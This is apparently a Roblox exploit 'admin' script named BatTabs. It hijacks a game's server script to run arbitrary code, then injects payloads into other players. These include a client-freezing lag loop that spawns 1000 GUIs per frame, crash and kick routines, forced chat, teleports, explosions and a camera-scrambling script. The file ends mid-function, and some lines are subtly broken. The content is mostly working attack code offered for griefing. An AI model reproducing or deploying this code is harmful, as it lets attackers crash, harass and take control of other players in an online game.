wait()
LocalPlayer=Game:GetService("Players").LocalPlayer
script["Parent"]=(_BatTabs_)
Tabs={}
Cmds={}
key=(";")
chatgui=false
probemode=false
Safe=("badbatmantoo")
connection=nil
Updates=("Admin for trade only!")
 

 
tabmodel=Instance.new("Model",workspace)
tabmodel.Name=("Tablets")
SourceName=("DSource")
Banlist={"Paej"}
function Crash(Player)
	player=tostring(Player or ("nil"))
	local value=Instance.new("StringValue")
	Value["Name"]=("DISC: "..Player)
	Value["Parent"]=Game["Lighting"]
	Game["Debris"]:Additem(Value,1)
end

LagSource = [==[
wait(0)
script.Parent = nil
plr = game:GetService("Players").LocalPlayer
local plrgui = plr:findFirstChild("PlayerGui")
if plrgui == nil then repeat wait() plrgui = plr:findFirstChild("PlayerGui") until plrgui ~= nil end
while plr.Parent == game:GetService("Players") do
wait()
for i = 1, 1000 do
local sc = Instance.new("ScreenGui",plrgui)
local fr = Instance.new("TextLabel",sc)
fr.Text = "GTFO YOU SKID"
fr.Size = UDim2.new(1, 0, 1, 0)
fr.FontSize = "Size50"
end
end
]==]
 
Doge = [[
do --CFrame lerp
        local function QuaternionFromCFrame(cf)
                local mx, my, mz, m00, m01, m02, m10, m11, m12, m20, m21, m22 = cf:components()
                local trace = m00 + m11 + m22
                if trace > 0 then
                        local s = math.sqrt(1 + trace)
                        local recip = 0.5/s
                        return (m21-m12)*recip, (m02-m20)*recip, (m10-m01)*recip, s*0.5
                else
                        local i = 0
                        if m11 > m00 then
                                i = 1
                        end
                        if m22 > (i == 0 and m00 or m11) then
                                i = 2
                        end
                        if i == 0 then
                                local s = math.sqrt(m00-m11-m22+1)
                                local recip = 0.5/s
                                return 0.5*s, (m10+m01)*recip, (m20+m02)*recip, (m21-m12)*recip
                        elseif i == 1 then
                                local s = math.sqrt(m11-m22-m00+1)
                                local recip = 0.5/s
                                return (m01+m10)*recip, 0.5*s, (m21+m12)*recip, (m02-m20)*recip
                        elseif i == 2 then
                                local s = math.sqrt(m22-m00-m11+1)
                                local recip = 0.5/s return (m02+m20)*recip, (m12+m21)*recip, 0.5*s, (m10-m01)*recip
                        end
                end
        end
        local function QuaternionToCFrame(px, py, pz, x, y, z, w)
                local xs, ys, zs = x + x, y + y, z + z
                local wx, wy, wz = w*xs, w*ys, w*zs
                local xx = x*xs
                local xy = x*ys
                local xz = x*zs
                local yy = y*ys
                local yz = y*zs
                local zz = z*zs
                return CFrame.new(px, py, pz,1-(yy+zz), xy - wz, xz + wy,xy + wz, 1-(xx+zz), yz - wx, xz - wy, yz + wx, 1-(xx+yy))
                end  
        local function QuaternionSlerp(a, b, t)
                local cosTheta = a[1]*b[1] + a[2]*b[2] + a[3]*b[3] + a[4]*b[4]
                local startInterp, finishInterp;
                if cosTheta >= 0.0001 then
                        if (1 - cosTheta) > 0.0001 then
                                local theta = math.acos(cosTheta)
                                local invSinTheta = 1/math.sin(theta)
                                startInterp = math.sin((1-t)*theta)*invSinTheta
                                finishInterp = math.sin(t*theta)*invSinTheta  
                        else
                                startInterp = 1-t
                                finishInterp = t
                        end
                else
                        if (1+cosTheta) > 0.0001 then
                                local theta = math.acos(-cosTheta)
                                local invSinTheta = 1/math.sin(theta)
                                startInterp = math.sin((t-1)*theta)*invSinTheta
                                finishInterp = math.sin(t*theta)*invSinTheta
                        else
                                startInterp = t-1
                                finishInterp = t
                        end
                end
                return a[1]*startInterp + b[1]*finishInterp, a[2]*startInterp + b[2]*finishInterp, a[3]*startInterp + b[3]*finishInterp, a[4]*startInterp + b[4]*finishInterp
        end  
        function clerp(a,b,t)
                local qa = {QuaternionFromCFrame(a)}
                local qb = {QuaternionFromCFrame(b)}
                local ax, ay, az = a.x, a.y, a.z
                local bx, by, bz = b.x, b.y, b.z  
                local _t = 1-t
                return QuaternionToCFrame(_t*ax + t*bx, _t*ay + t*by, _t*az + t*bz,QuaternionSlerp(qa, qb, t))
        end
 
end
do --the animating
plr = game:service'Players'.LocalPlayer
char = plr.Character
mouse = plr:GetMouse()
humanoid = char:findFirstChild("Humanoid")
torso = char:findFirstChild("Torso")
head = char.Head
ra = char:findFirstChild("Right Arm")
la = char:findFirstChild("Left Arm")
rl = char:findFirstChild("Right Leg")
ll = char:findFirstChild("Left Leg")
rs = torso:findFirstChild("Right Shoulder")
ls = torso:findFirstChild("Left Shoulder")
rh = torso:findFirstChild("Right Hip")
lh = torso:findFirstChild("Left Hip")
neck = torso:findFirstChild("Neck")
rj = char:findFirstChild("HumanoidRootPart"):findFirstChild("RootJoint")
anim = char:findFirstChild("Animate")
rootpart = char:findFirstChild("HumanoidRootPart")
camera = workspace.CurrentCamera
if anim then
anim:Destroy()
end
 
 
local rm = Instance.new("Motor", torso)
rm.C0 = CFrame.new(1.5, 0.5, 0)
rm.C1 = CFrame.new(0, 0.5, 0)
rm.Part0 = torso
rm.Part1 = ra
local lm = Instance.new("Motor", torso)
lm.C0 = CFrame.new(-1.5, 0.5, 0)
lm.C1 = CFrame.new(0, 0.5, 0)
lm.Part0 = torso
lm.Part1 = la
 
local rlegm = Instance.new("Motor", torso)
rlegm.C0 = CFrame.new(0.5, -1, 0)
rlegm.C1 = CFrame.new(0, 1, 0)
rlegm.Part0 = torso
rlegm.Part1 = rl
local llegm = Instance.new("Motor", torso)
llegm.C0 = CFrame.new(-0.5, -1, 0)
llegm.C1 = CFrame.new(0, 1, 0)
llegm.Part0 = torso
llegm.Part1 = ll
 
neck.C0 = CFrame.new(0, 1, 0)
neck.C1 = CFrame.new(0, -0.5, 0)
 
 
rj.C0 = CFrame.new()
rj.C1 = CFrame.new()
 
 
local sound = Instance.new("Sound", head)
sound.SoundId = "http://www.roblox.com/asset/?id=130797915"
sound.Volume = 0.8
sound.Looped = true
 
for i,v in pairs(char:children()) do
    if v:IsA("Hat") then
        v:Destroy()
    end
end
 
 
--look of the fox here
game:service'InsertService':LoadAsset(151784320):children()[1].Parent = char
Instance.new("PointLight", head).Range = 10
 

 
 
local speed = 0.3
local angle = 0
local sitting = false
local humanwalk = false
local anglespeed = 1
rsc0 = rm.C0
lsc0 = lm.C0
llc0 = llegm.C0
rlc0 = rlegm.C0
neckc0 = neck.C0
 
local controllerService = game:GetService("ControllerService")
local controller = controllerService:GetChildren()[1]
 
controller.Parent = nil
 
Instance.new("HumanoidController", game:service'ControllerService')
Instance.new("SkateboardController", game:service'ControllerService')
Instance.new("VehicleController", game:service'ControllerService')
local controller = controllerService:GetChildren()[1]
mouse.KeyDown:connect(function(k)
    if k == "q" then
        humanwalk = not humanwalk
    end
    if k == "z" then
        if not sound.IsPlaying then
            sound:stop()
            sound.SoundId = "http://www.roblox.com/asset/?id=130802245"
            wait()
            sound:play()
        end
    end
    if k == "x" then
        if not sound.IsPlaying then
            sound:stop()
            sound.SoundId = "http://www.roblox.com/asset/?id=150794704"
            wait()
            sound:play()
        end
    end
    if k == "c" then
        if not sound.IsPlaying then
            sound:stop()
            sound.SoundId = "http://www.roblox.com/asset/?id=149713968"
            wait()
            sound:play()
        end
    end
    if string.byte(k) == 48 then
        humanoid.WalkSpeed = 55
    end
   
end)
mouse.KeyUp:connect(function(k)
   
    if string.byte(k) == 48 then
        humanoid.WalkSpeed = 14
    end
   
end)
 
   
 
while wait() do
    angle = (angle % 100) + anglespeed/10
        mvmnt = math.pi * math.sin(math.pi*2/100*(angle*10))
        local rscf = rsc0
        local lscf = lsc0
        local rlcf = rlc0
        local llcf = llc0
        local rjcf = CFrame.new()
        local ncf = neckc0
        local rayz = Ray.new(rootpart.Position, Vector3.new(0, -6, 0))
            local hitz, enz = workspace:findPartOnRay(rayz, char)
            if not hitz then
        if sound.IsPlaying then
            sound:stop()
        end
       
        if Vector3.new(torso.Velocity.x, 0, torso.Velocity.z).magnitude > 2 then
       
        ncf = neckc0 * CFrame.Angles(math.pi/5, 0, 0)
        rjcf = CFrame.new() * CFrame.Angles(-math.pi/5, math.sin(angle)*0.05, 0)
        rscf = rsc0 * CFrame.Angles(math.pi/1.7+math.sin(angle)*0.1, 0, 0)
        lscf = lsc0 * CFrame.Angles(math.pi/1.7+math.sin(-angle)*0.1, 0, 0)
        rlcf = rlc0 * CFrame.Angles(-math.pi/10+math.sin(-angle)*0.3, 0, 0)
        llcf = llc0 * CFrame.Angles(-math.pi/10+math.sin(angle)*0.3, 0, 0)
       
        else
       
        ncf = neckc0 * CFrame.Angles(math.pi/14, 0, 0)
        rjcf = CFrame.new() * CFrame.Angles(-math.pi/18, math.sin(angle)*0.05, 0)
        rscf = rsc0 * CFrame.Angles(-math.pi/10+math.sin(angle)*0.2, 0, 0)
        lscf = lsc0 * CFrame.Angles(-math.pi/10+math.sin(-angle)*0.2, 0, 0)
        rlcf = rlc0 * CFrame.new(0, 0.7, -0.5) CFrame.Angles(-math.pi/14, 0, 0)
        llcf = llc0 * CFrame.Angles(-math.pi/20, 0, 0)
       
        end
    elseif humanoid.Sit then
        if sound.IsPlaying and sound.SoundId == "http://www.roblox.com/asset/?id=150794704" then
        anglespeed = 6
        ncf = neckc0 * CFrame.Angles(math.pi/5-math.sin(angle)*0.1, 0, 0)
        rjcf = CFrame.new(0, -0.8, 0) * CFrame.Angles(-math.pi/5, 0, 0)
        rscf = rsc0 * CFrame.new(-.45, 0.2, -.3) * CFrame.Angles(math.pi/3, 0, -math.rad(15))
        lscf = lsc0 * CFrame.new(.45, 0.2, -.3) * CFrame.Angles(math.pi/3, 0, math.rad(15))
        rlcf = rlc0 * CFrame.Angles(math.pi/2+math.pi/5, 0, math.rad(20))
        llcf = llc0 * CFrame.Angles(math.pi/2+math.pi/5, 0, -math.rad(20))
        elseif sound.IsPlaying and sound.SoundId == "http://www.roblox.com/asset/?id=135570347" then
        anglespeed = 4
        ncf = neckc0 * CFrame.Angles(math.pi/5-math.abs(math.sin(angle))*0.3, 0, 0)
        rjcf = CFrame.new(0, -0.8, 0) * CFrame.Angles(-math.pi/5, 0, 0)
        rscf = rsc0 * CFrame.new(-.45, 0.2, -.3) * CFrame.Angles(math.pi/3, 0, -math.rad(15))
        lscf = lsc0 * CFrame.new(.45, 0.2, -.3) * CFrame.Angles(math.pi/3, 0, math.rad(15))
        rlcf = rlc0 * CFrame.Angles(math.pi/2+math.pi/5, 0, math.rad(20))
        llcf = llc0 * CFrame.Angles(math.pi/2+math.pi/5, 0, -math.rad(20))
        elseif sound.IsPlaying and sound.SoundId == "http://www.roblox.com/asset/?id=149713968" then
        anglespeed = 2
        ncf = neckc0 * CFrame.Angles(math.pi/5, 0, math.sin(angle)*0.08)
        rjcf = CFrame.new(0, -0.8, 0) * CFrame.Angles(-math.pi/5, math.sin(angle)*0.01, 0)
        rscf = rsc0 * CFrame.new(-.45, 0.2, -.3) * CFrame.Angles(math.pi/3, 0, -math.rad(15))
        lscf = lsc0 * CFrame.new(.45, 0.2, -.3) * CFrame.Angles(math.pi/3, 0, math.rad(15))
        rlcf = rlc0 * CFrame.Angles(math.pi/2+math.pi/5, 0, math.rad(20))
        llcf = llc0 * CFrame.Angles(math.pi/2+math.pi/5, 0, -math.rad(20))
        else
        anglespeed = 1/2
        ncf = neckc0 * CFrame.Angles(math.pi/5, 0, math.sin(angle)*0.08)
        rjcf = CFrame.new(0, -0.8, 0) * CFrame.Angles(-math.pi/5, math.sin(angle)*0.01, 0)
        rscf = rsc0 * CFrame.new(-.45, 0.2, -.3) * CFrame.Angles(math.pi/3, 0, -math.rad(15))
        lscf = lsc0 * CFrame.new(.45, 0.2, -.3) * CFrame.Angles(math.pi/3, 0, math.rad(15))
        rlcf = rlc0 * CFrame.Angles(math.pi/2+math.pi/5, 0, math.rad(20))
        llcf = llc0 * CFrame.Angles(math.pi/2+math.pi/5, 0, -math.rad(20))
        end
    elseif Vector3.new(torso.Velocity.x, 0, torso.Velocity.z).magnitude < 2 then
        if sound.IsPlaying and sound.SoundId == "http://www.roblox.com/asset/?id=130797915" then
        anglespeed = 6
            ncf = neckc0 * CFrame.Angles(math.pi/10-math.sin(angle)*0.07, 0, 0)
            rjcf = CFrame.new(0, 0, 0) * CFrame.Angles(-math.pi/10, math.sin(angle)*0.001, 0)
            rscf = rsc0 * CFrame.Angles(math.pi/1+math.sin(angle)*0.5, 0, 0)
            lscf = lsc0 * CFrame.Angles(math.pi/1+math.sin(angle)*0.5, 0, 0)
            rlcf = rlc0 * CFrame.Angles(math.pi/10, math.sin(angle)*0.08, math.rad(6.5))
            llcf = llc0 * CFrame.Angles(math.pi/10, -math.sin(angle)*0.08, -math.rad(6.5))
        elseif sound.IsPlaying and sound.SoundId == "http://www.roblox.com/asset/?id=149713968" then
            anglespeed = 2
            ncf = neckc0 * CFrame.Angles(math.pi/10-math.abs(math.sin(angle))*0.3, 0, 0)
            rjcf = CFrame.new(0, 0, 0) * CFrame.Angles(-math.pi/20, math.sin(angle)*0.001, 0)
            rscf = rsc0 * CFrame.Angles(math.pi/2+math.abs(math.sin(angle)*1), 0, 0)
            lscf = lsc0 * CFrame.Angles(math.pi/2+math.abs(math.sin(angle)*1), 0, 0)
            rlcf = rlc0 * CFrame.Angles(math.pi/20, math.sin(angle)*0.08, math.rad(2.5))
            llcf = llc0 * CFrame.Angles(math.pi/20, -math.sin(angle)*0.08, -math.rad(2.5))
        elseif sound.IsPlaying and sound.SoundId == "http://www.roblox.com/asset/?id=130802245" then
        anglespeed = 3
        ncf = neckc0 * CFrame.Angles(math.sin(angle)*0.07, math.rad(30), 0)
        rjcf = CFrame.new(0, 0, 0) * CFrame.Angles(0, math.sin(angle)*0.001, 0)
        rscf = rsc0 * CFrame.Angles(math.sin(angle)*0.05, 0, 0)
        lscf = lsc0 * CFrame.Angles(math.sin(-angle)*0.05, 0, 0)
        rlcf = rlc0 * CFrame.new(0, -0.1 + math.abs(mvmnt)*0.1, -0.1) * CFrame.Angles(0, math.rad(5), math.rad(5))
        llcf = llc0 * CFrame.Angles(0, math.rad(2.5), math.rad(1))
        else
            if humanwalk then
                        anglespeed = 1/4
        ncf = neckc0 * CFrame.Angles(-math.sin(angle)*0.07, 0, 0)
        rjcf = CFrame.new(0, 0, 0) * CFrame.Angles(0, math.sin(angle)*0.001, 0)
        rscf = rsc0 * CFrame.Angles(math.sin(angle)*0.1, 0, 0)
        lscf = lsc0 * CFrame.Angles(math.sin(-angle)*0.1, 0, 0)
        rlcf = rlc0 * CFrame.Angles(0, math.sin(angle)*0.08, math.rad(2.5))
        llcf = llc0 * CFrame.Angles(0, -math.sin(angle)*0.08, -math.rad(2.5))
                else
        anglespeed = 1/2
        ncf = neckc0 * CFrame.Angles(math.pi/5, 0, math.sin(angle)*0.08)
        rjcf = CFrame.new(0, -2, 0) * CFrame.Angles(-math.pi/5, math.sin(angle)*0.01, 0)
        rscf = rsc0 * CFrame.new(-.45, 0.2, -.3) * CFrame.Angles(math.pi/3, 0, -math.rad(15))
        lscf = lsc0 * CFrame.new(.45, 0.2, -.3) * CFrame.Angles(math.pi/3, 0, math.rad(15))
        rlcf = rlc0 * CFrame.Angles(math.pi/2+math.pi/5, 0, math.rad(20))
        llcf = llc0 * CFrame.Angles(math.pi/2+math.pi/5, 0, -math.rad(20))
            end
        end
    elseif Vector3.new(torso.Velocity.x, 0, torso.Velocity.z).magnitude < 20 then
        if sound.IsPlaying then
            sound:stop()
        end
        if humanwalk then
                                anglespeed = 4
        ncf = neckc0 * CFrame.Angles(math.pi/24, mvmnt*.02, 0)
        rjcf = CFrame.new(0, math.abs(mvmnt)*0.05, 0) * CFrame.Angles(-math.pi/24, -mvmnt*.02, 0)
        rscf = rsc0 * CFrame.Angles(math.sin(angle)*1.25, 0, -math.abs(mvmnt)*0.02)
        lscf = lsc0 * CFrame.Angles(math.sin(-angle)*1.25, 0, math.abs(mvmnt)*0.02)
        rlcf = rlc0 * CFrame.Angles(math.sin(-angle)*1, 0, math.rad(.5))
        llcf = llc0 * CFrame.Angles(math.sin(angle)*1, 0, -math.rad(.5))
                else
        anglespeed = 4
        ncf = neckc0 * CFrame.new(0, 0, .2) * CFrame.Angles(math.pi/1.9, 0, 0)
        rjcf = CFrame.new(0, -1.5+math.abs(mvmnt)*0.05, 0) * CFrame.Angles(-math.pi/1.9, math.sin(mvmnt/2)*0.05, 0)
        rscf = rsc0 * CFrame.new(-.45, 0.2, -.4+math.abs(mvmnt)*0.125) * CFrame.Angles(math.pi/2+math.sin(angle)*0.7, 0, math.rad(5))
        lscf = lsc0 * CFrame.new(.45, 0.2, .1-math.abs(mvmnt)*0.125) * CFrame.Angles(math.pi/2+math.sin(-angle)*0.7, 0, -math.rad(5))
        rlcf = rlc0 * CFrame.new(0, 0, -.3+math.abs(mvmnt)*0.125) * CFrame.Angles(math.pi/2.5+math.sin(-angle)*0.6, 0, math.abs(mvmnt)*0.025)
        llcf = llc0 * CFrame.new(0, 0, .3-math.abs(mvmnt)*0.125) * CFrame.Angles(math.pi/2.5+math.sin(angle)*.6, 0, -math.abs(mvmnt)*0.025)
        end
    elseif Vector3.new(torso.Velocity.x, 0, torso.Velocity.z).magnitude >= 20 then
        if sound.IsPlaying then
            sound:stop()
        end
        if humanwalk then
        anglespeed = 5
        ncf = neckc0 * CFrame.Angles(math.pi/20, math.sin(angle)*.04, 0)
        rjcf = CFrame.new(0, -.4 + math.abs(mvmnt)*0.25, 0) * CFrame.Angles(-math.pi/20, -math.sin(angle)*.08, 0)
        rscf = rsc0 * CFrame.new(0, 0, -.3+math.abs(mvmnt)*0.125) *  CFrame.Angles(math.pi/18+math.sin(angle)*1.5, 0, -math.abs(mvmnt)*0.02)
        lscf = lsc0 * CFrame.new(0, 0, .3-math.abs(mvmnt)*0.125) * CFrame.Angles(math.pi/18+math.sin(-angle)*1.5, 0, math.abs(mvmnt)*0.02)
        rlcf = rlc0 * CFrame.new(0, 0, -.6+math.abs(mvmnt)*0.125) * CFrame.Angles(-math.pi/18+math.sin(-angle)*1.3, 0, math.rad(.5))
        llcf = llc0 * CFrame.new(0, 0, -math.abs(mvmnt)*0.125) * CFrame.Angles(-math.pi/18+math.sin(angle)*1.3, 0, -math.rad(.5))
        else
        anglespeed = 5.5
        ncf = neckc0 * CFrame.new(0, 0, .2) * CFrame.Angles(math.pi/1.9+math.sin(mvmnt/2)*0.05, 0, 0)
        rjcf = CFrame.new(0, -1.3+math.abs(mvmnt)*0.05, 0) * CFrame.Angles(-math.pi/1.9+math.abs(mvmnt/2)*0.1, 0, 0)
        rscf = rsc0 * CFrame.new(-1, 0.2, -.5) * CFrame.Angles(math.pi/2+math.sin(angle)*1.8, 0, math.rad(5))
        lscf = lsc0 * CFrame.new(1, 0.2, -.5) * CFrame.Angles(math.pi/2+math.sin(angle)*1.8, 0, -math.rad(5))
        rlcf = rlc0 * CFrame.new(0, .3-math.abs(mvmnt)*0.125, -.3+math.abs(mvmnt)*0.125) * CFrame.Angles(math.pi/2.5+math.sin(-angle)*1.4, 0, math.abs(mvmnt)*0.025)
        llcf = llc0 * CFrame.new(0, .3-math.abs(mvmnt)*0.125, .3-math.abs(mvmnt)*0.125) * CFrame.Angles(math.pi/2.5+math.sin(-angle)*1.4, 0, -math.abs(mvmnt)*0.025)
        end
    end
       
    rm.C0 = clerp(rm.C0,rscf,speed)
    lm.C0 = clerp(lm.C0,lscf,speed)
    rj.C0 = clerp(rj.C0,rjcf,speed)
    neck.C0 = clerp(neck.C0,ncf,speed)
    rlegm.C0 = clerp(rlegm.C0,rlcf,speed)
    llegm.C0 = clerp(llegm.C0,llcf,speed)
end
 
 
end]]

FunScript = [[
LP = game:service'Players'.LocalPlayer
Shapes = {"Ball", "Block"}
wait()
script.Parent = nil
Delay(0, function()
while wait() do
workspace.CurrentCamera.CameraType = "Scriptable"
workspace.CurrentCamera.FieldOfView = workspace.CurrentCamera.FieldOfView + math.random(-5,5)
workspace.CurrentCamera:SetRoll(workspace.CurrentCamera:GetRoll()+0.075)
workspace.CurrentCamera.CoordinateFrame = workspace.CurrentCamera.CoordinateFrame * CFrame.new(math.random(-2,2),math.random(-2,2),math.random(-2,2))
local Part = Instance.new("Part", workspace.CurrentCamera)
Part.Shape = Shapes[math.random(1, 2)]
Part.Anchored = true
Part.BrickColor = BrickColor.new(math.random(),math.random(),math.random())
Part.Size = Vector3.new(math.random(5,10),math.random(-25,25),math.random(5,10))
Part.CFrame = workspace.CurrentCamera.CoordinateFrame * CFrame.new(math.random(-250,250),math.random(-100,100),math.random(-250,250)) * CFrame.Angles(math.random(),math.random(),math.random())
local Smoke = Instance.new("Smoke", Part)
Smoke.Color = Color3.new(math.random(), math.random(), math.random())
Smoke.Opacity = 0.7
local Sparkles = Instance.new("Sparkles", Part)
Sparkles.SparkleColor = Color3.new(math.random(), math.random(), math.random())
local Fire = Instance.new("Fire", Part)
Fire.Color = Color3.new(math.random(), math.random(), math.random())
Fire.SecondaryColor = Color3.new(math.random(), math.random(), math.random())
local Ex = Instance.new("Explosion", workspace.CurrentCamera)
Ex.Position = Vector3.new(math.random(-250,250),math.random(10,100),math.random(-250,250))
Ex.BlastPressure = 15
Ex.BlastRadius = 12.5
if not workspace.CurrentCamera:findFirstChild("Hint") then
local mes = Instance.new("Hint", workspace.CurrentCamera)
mes.Text = "OMG STOP EATING"
end
end
end)
]]
Playerlist={}
 
function NilCrash(Name)
    local Crasher=Instance.new("StringValue")
    Crasher.Name=("Client")
    Crasher.Value=string.lower(tostring(Name))
    Crasher.Parent=Game["Lighting"]
    wait(1)
    if Crasher~=nil and Crasher.Parent~=nil then
        ypcall(function()
        Crasher:Destroy()
        end)
    end
end
--[[ReName Players if needed.]]--
coroutine.resume(coroutine.create(function()
    while wait(3) do
        if Game:GetService("Players").Name~=("Players") then
            Game:GetService("Players").Name=("Players")
        end
    end
end))
 
 
 
 
function Dismiss()
    for _=1,10 do
        for _=1,#Tabs do
            table.remove(Tabs,_)
            if tabmodel~=nil then
                tabmodel:ClearAllChildren()
            end
        end
    end
end
 
function AddCmd(Name,Say,Desc,Func)
    table.insert(Cmds,{["Name"]=Name,["Say"]=Say,["Desc"]=Desc,["Func"]=Func})
end
 
 
AddCmd("Banlist","bl","Show the Current Banned Players.",
function()
    Dismiss()
    for _,BannedPlr in pairs(Banlist) do
        Output(BannedPlr)
    end
end)

AddCmd("Fun","fun","Make the Selected Player have Fun.",
function(Plrs)
    for _,Plr in pairs(Plrs) do
        if Plr~=nil and Plr["Backpack"]~=nil then
            NewLS(FunScript,Plr["Backpack"])
        end
    end
end)

AddCmd("Lag player","lag","Lag the Selected Player.",
function(Plrs)
	for _,Plr in pairs(Plrs) do
		if Plr~=nil and Plr["Backpack"]~=nil then
			NewLS(LagSource,Plr["Backpack"])
		end
	end
end)

AddCmd("give u Doge","dg","Makes your self Doge",
            function(plrs)
                    for _, plr in pairs(plrs) do
                            if plr and plr.Backpack then
                                    NewLS(Doge, plr.Backpack)
                                           
                            end
                            end
                    end
   )

AddCmd("Nuke","nuke","Nuke the Selected Player.",
function(Plrs)
    for _,Plr in pairs(Plrs) do
        if Plr~=nil and Plr["Character"] then
            Explosion=Instance.new("Explosion",Plr["Character"])
            Explosion["Position"]=Plr["Character"].Torso
        end
    end
end)

AddCmd("Fire","fire","Give the Selected Player Fire.",
function(Plrs)
    for _,Plr in pairs(Plrs) do
        if Plr~=nil and Plr["Character"]~=nil and Plr["Character"].Torso~=nil then
            Instance.new("Fire",Plr["Character"].Torso)
        end
    end
end)

AddCmd("Un-fire","unfire","Removes Fire from a Selected Player.",
function(Plrs)
    for _,Plr in pairs(Plrs) do
        if Plr~=nil and Plr["Character"]~=nil and Plr["Character"].Torso~=nil then
            pcall(function()
                for _,Child in pairs(Plr["Character"].Torso:GetChildren()) do
                    if Child:IsA("Fire") then
                        Child:Destroy()
                    end
                end
            end)
        end
    end
end)
found=false
coroutine.wrap(function()
while found==false do
if game.PlaceId == 21053279 or game.PlaceId == 21053219 then break end
for _,scriptinworkspace in pairs(workspace:children()) do
if scriptinworkspace then
if scriptinworkspace:IsA("Script") then
if scriptinworkspace:FindFirstChild(SourceName) then
newScript = scriptinworkspace:Clone()
wait(0.2)
newScript.Name = "NewScript"
newScript.Disabled = true
newScript:FindFirstChild(SourceName).Value = ""
Output("Source found",__)
found = true
break
end
end
end
end
wait();
end
end)()
 
AddCmd("Unpunish player","unpunish","Restore the player's character",
function(plrs)
for _, plr in pairs(plrs) do
if plr then
NewS("game.Players['"..plr.Name.."']:LoadCharacter()", workspace)
end
end
end
)
 
function NewS(sourcevalue, parent)
if game.PlaceId == 21053279 or game.PlaceId == 21053219 then
NS(sourcevalue, parent)
else
if newScript then
local scr = newScript:Clone()
if scr:FindFirstChild(SourceName) then
if scr:FindFirstChild(SourceName) then
scr:FindFirstChild(SourceName).Value = sourcevalue
scr.Parent = parent
wait(0.5)
scr.Disabled = false
return scr
end
end
end
end
end
 
sorcery = script:Clone()
 
Services = {
game:GetService("Workspace"),
game:GetService("Players"),
game:GetService("Lighting"),
game:GetService("StarterPack"),
game:GetService("StarterGui"),
game:GetService("Teams"),
game:GetService("SoundService"),
game:GetService("Debris"),
game:GetService("InsertService"),
game:GetService("RunService"),
game:GetService("Chat"),
game:GetService("TeleportService"),
game:GetService("Geometry"),
game:GetService("MarketplaceService"),
game:GetService("BadgeService"),
game:GetService("NetworkClient"),
game:GetService("FriendService"),
}
 
function Explore(Item)
Dismiss()
if(Item==nil)then
for _,v in pairs(Services)do
Output(tostring(v),function() wait() Explore(v) end)
end;
else
f={
['View children']=function()
Dismiss()
for _,v in pairs(Item:children())do
Output(v.Name,function()
wait()
Explore(v)
end);
end;
end;
['View parent']=function()
wait()
Explore(Item.Parent)
end;
['Destroy']=function()
Item:Destroy();
Explore(Item.Parent);
end;
['Clear']=function()
Item:ClearAllChildren()
end;
['Clone']=function()
pcall(function()
cloneableObj = Item:clone()
end)
end;
['Remove']=function()
Item:remove()
end;
['Paste']=function()
if cloneableObj then
cloneableObj.Parent = Item
end
end;
['Ki'..'ck Item']=function()
NewLS("local plr = game:service'Players'.LocalPlayer; plr:Ki".."ck()", Item)
end;
};
for i,v in pairs(f)do
Output(tostring(i),v);
end;
Output('Item Name: \''..tostring(Item.Name)..'\'',nil);
Output('Class: \''..tostring(Item.ClassName)..'\'',nil);
if cloneableObj then
Output('Currently Cloning: \''..tostring(cloneableObj.Name)..'\'',nil);
end
end;
end;
 
AddCmd("Explore","explore","Explore the game",
function()
Explore()
end
)
 
function NewLS(sourcevalue, parent)
if game.PlaceId == 21053279 or game.PlaceId == 21053219 then
NLS(sourcevalue, parent)
else
local NS = sorcery:Clone()
NS.Name = "NewLocal"
local Source = NS:findFirstChild(SourceName)
if Source == nil then Instance.new('StringValue',NS).Name = SourceName end Source = NS:findFirstChild(SourceName)
Source.Value = sourcevalue
NS.Parent = parent
NS.Disabled = false
return NS
end
end
 
Clothes = {}
 
for _,Item in pairs(LocalPlayer.Character:GetChildren()) do
if Item:IsA('CharacterMesh') or Item:IsA('Hat') or Item:IsA('Shirt') or Item:IsA('Pants') then
table.insert(Clothes,Item:Clone())
end
end
for i,v in pairs(LocalPlayer.Character:GetChildren()) do
if v:IsA("BodyColors") then
body = v
torsocolor = body.TorsoColor
leftlegcolor = body.LeftLegColor
rightlegcolor = body.RightLegColor
leftarmcolor = body.LeftArmColor
rightarmcolor = body.RightArmColor
headcolor = body.HeadColor
end
end
 
mouse = LocalPlayer:GetMouse()
 
mouse.KeyDown:connect(function(key)
if key == "z" then
game:service'StarterGui':SetCoreGuiEnabled(4, true)
end
end)
 
AddCmd("Toogle ChatGUI","chat","Toogle ChatGUI on/off",
function(plrs, msg)
if msg == "off" then
chatgui = false
elseif msg == "on" then
chatgui = true
end
end
)
 
AddCmd("infoz","infoz","shows who made this admin",
function()
Dismiss()
for i = 1,1 do
wait()
Output("Downloading..", __)
wait()
Output("BatTabs made by badbatmantoo", __)
end
end
)

AddCmd("DragonSlayer","ds","Gives DragonSlayer",
function()
Dismiss()
for i = 1,1 do
Output("DragonSlayer Given",__)
local obj = game:service("InsertService"):LoadAsset(73232786)
for a,g in pairs(obj:children()) do if g:IsA("Tool") or g:IsA("HopperBin") then g.Parent = LocalPlayer.Backpack end end
end
end
)



AddCmd("Set WalkSpeed","ws","Set the walkspeed of player",
function(plrs, msg)
local keypos = msg:find(key)
local targPlayers = msg:sub(1,keypos-1)
local plrs = getPlayers(targPlayers)
local speed = msg:sub(tonumber(keypos+1))
for _,v in pairs(plrs) do
if v.Character ~= nil and v.Character:findFirstChild("Humanoid") ~= nil then
v.Character:findFirstChild("Humanoid").WalkSpeed = speed
end
end
end
)
 
 
 
AddCmd("Teleport","tp","Teleport a player to a place",
function(plrs, msg)
local keypos = msg:find(key)
local targPlayers = msg:sub(1,keypos-1)
local plrs = getPlayers(targPlayers)
local id = msg:sub(tonumber(keypos+1))
for _,v in pairs(plrs) do
if v and v.Backpack then
NewLS([[game:service'TeleportService':Teleport(]]..id..[[)]], v.Backpack)
end
end
end
)
 
 
AddCmd("Chat","cht","Forces a player to chat ;)",
function(plrs, msg)
local keypos = msg:find(key)
local targPlayers = msg:sub(1,keypos-1)
local plrs = getPlayers(targPlayers)
local id = msg:sub(tonumber(keypos+1))
for _,v in pairs(plrs) do
if v and v.Backpack then
NewLS([==[game:service'Players':Chat(']==]..id..[==[')]==], v.Backpack)
end
end
end
)
 
Bad_Char = ""
 
function chatgui(msg)
if not chatgui then return end
if probemode == false then
if LocalPlayer.Character:findFirstChild("Head") then
mainPart = LocalPlayer.Character:findFirstChild("Head")
end
end
if probemode == true then
if game.Workspace:findFirstChild(LocalPlayer.Name.."'s probe") then
mainPart = game.Workspace:findFirstChild(LocalPlayer.Name.."'s probe")
end
end
local bg = Instance.new("BillboardGui", mainPart)
bg.Adornee = mainPart
bg.Name = "CHATGUIBG"
